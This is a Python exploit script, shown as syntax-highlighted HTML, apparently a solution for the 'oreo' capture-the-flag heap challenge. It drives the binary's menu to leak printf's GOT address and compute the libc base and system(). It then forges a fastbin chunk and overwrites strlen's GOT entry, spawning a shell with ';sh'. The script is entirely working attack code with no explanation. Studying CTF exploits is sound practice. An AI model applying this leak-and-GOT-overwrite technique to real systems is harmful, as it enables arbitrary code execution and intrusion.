<div class="highlight"><pre><span class="kn">from</span> <span class="nn">zio</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">pwn</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">zio</span><span class="p">(</span><span class="s">&#39;stdbuf -o0 ./oreo&#39;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s">&#39;/usr/lib/libc.so.6&#39;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">desp</span><span class="p">):</span>
	<span class="n">p</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;Rifle name:&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;Rifle description:&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="n">desp</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;Action:&#39;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">leave</span><span class="p">(</span><span class="n">mesg</span><span class="p">):</span>
	<span class="n">p</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;o submit with your order:&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="n">mesg</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
<span class="k">def</span> <span class="nf">order</span><span class="p">():</span>
	<span class="n">p</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;Action:&#39;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
	<span class="n">p</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;Action:&#39;</span><span class="p">)</span>
<span class="n">printf_got</span> <span class="o">=</span> <span class="mh">0x804A234</span>

<span class="c">#leak</span>
<span class="n">add</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="o">*</span><span class="mi">27</span> <span class="o">+</span> <span class="n">l32</span><span class="p">(</span><span class="n">printf_got</span><span class="p">),</span><span class="s">&#39;b&#39;</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">show</span><span class="p">()</span>
<span class="n">printf_r</span> <span class="o">=</span> <span class="n">l32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;Description: &#39;</span><span class="p">)[</span><span class="mi">2</span><span class="p">][:</span><span class="mi">4</span><span class="p">])</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">printf_r</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&#39;printf&#39;</span><span class="p">]</span>
<span class="n">system_r</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&#39;system&#39;</span><span class="p">]</span>
<span class="n">log</span><span class="p">(</span><span class="s">&#39;libcbase: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">),</span> <span class="s">&#39;blue&#39;</span><span class="p">)</span>
<span class="n">log</span><span class="p">(</span><span class="s">&#39;system: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_r</span><span class="p">),</span> <span class="s">&#39;red&#39;</span><span class="p">)</span>

<span class="c">#creat 2 fastbin</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x3e</span><span class="p">):</span>
	<span class="n">add</span><span class="p">(</span><span class="s">&#39;c&#39;</span><span class="o">*</span><span class="mi">27</span> <span class="o">+</span> <span class="n">l32</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="s">&#39;dddd&#39;</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="s">&#39;ffff&#39;</span><span class="p">,</span> <span class="s">&#39;eeee&#39;</span><span class="p">)</span>
<span class="n">order</span><span class="p">()</span>	

<span class="c">#over write </span>
<span class="n">fake_ptr</span> <span class="o">=</span> <span class="mh">0x804A2a0</span>
<span class="n">strlen_got</span> <span class="o">=</span> <span class="mh">0x0804A250</span>

<span class="n">add</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="o">*</span><span class="mi">31</span> <span class="o">+</span> <span class="n">l32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="o">+</span> <span class="n">l32</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span> <span class="o">+</span> <span class="n">l32</span><span class="p">(</span><span class="n">fake_ptr</span><span class="p">),</span> <span class="s">&#39;b&#39;</span><span class="p">)</span>	<span class="c">#over write</span>
<span class="n">add</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">,</span> <span class="s">&#39;b&#39;</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">,</span> <span class="n">l32</span><span class="p">(</span><span class="n">strlen_got</span><span class="p">))</span>	<span class="c">#over write strlen_got</span>
<span class="n">leave</span><span class="p">(</span><span class="n">l32</span><span class="p">(</span><span class="n">system_r</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;;sh</span><span class="se">\0</span><span class="s">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</pre></div>